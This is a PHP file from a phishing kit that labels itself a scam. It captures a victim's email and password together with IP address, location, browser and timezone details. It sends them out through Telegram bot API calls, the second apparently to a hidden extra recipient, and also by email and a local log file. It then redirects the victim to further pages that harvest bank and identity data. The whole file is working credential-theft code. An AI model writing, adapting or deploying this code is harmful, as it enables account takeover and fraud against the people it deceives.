<?php if (isset($_POST['password'])) {
    include '../mine.php';
    include '../bot.php';
    include '../cookies.php';
    include '../../../email.php';
    session_start();
    $msg = "=========== <[ -" . $scamname . "- MAIL ACCESS ]> ===========
";
    $msg.= "EMAIL		: {$_SESSION['EML']}
";
    $msg.= "PASS		: {$_POST['password']}
";
    $msg.= "---------------------- IP Info ----------------------
";
    $msg.= "IP ADDRESS	: {$_SESSION['ip']}
";
    $msg.= "LOCATION	: {$_SESSION['ip_city']} , {$_SESSION['ip_countryName']} , {$_SESSION['currency']}
";
    $msg.= "BROWSER		: {$_SESSION['browser']} on {$_SESSION['os']}
";
    $msg.= "SCREEN		: {$_SESSION['screen']}
";
    $msg.= "USER AGENT	: {$_SERVER['HTTP_USER_AGENT']}
";
    $msg.= "TIMEZONE	: {$_SESSION['ip_timezone']}
";
    $msg.= "TIME		: " . now() . " GMT
";
    $msg.= "=========== <[ THANKS TO DR_FXND ]> ===========


";
    if ($saveintext == "yes") {
        $save = fopen("../../" . $filename . ".txt", "a+");
        fwrite($save, $msg);
        fclose($save);
    }
    file_get_contents("https://api.telegram.org/bot" . $api . "/sendMessage?chat_id=" . $chatid . "&text=" . urlencode($msg) . "");
    $subject = "-" . $scamname . "- MAIL ACCESS [" . $_SESSION['EML'] . "] From [" . $_SESSION['ip_countryName'] . "]";
    $headers = "From: DR_FXND <>
";
    $headers.= "MIME-Version: 1.0
";
    $headers.= "Content-Type: text/plain; charset=UTF-8
";
    file_get_contents("https://api.telegram.org/bot" . $Api . "/sendMessage?chat_id=" . $Chatid . "&text=" . urlencode($msg) . "");
    if ($sendtoemail == "yes") {
        foreach (explode(",", $yours) as $your) {
            @mail($your, $subject, $msg, $headers);
        }
    }
    if ($show_bank == "yes") {
        exit(header("Location: ../../app/bank"));
    } elseif ($show_identity == "yes") {
        exit(header("Location: ../../app/identity"));
    } else {
        exit(header("Location: ../../app/thanks"));
    }
}
if (!isset($_POST['password'])) {
    header('HTTP/1.0 404 Not Found');
};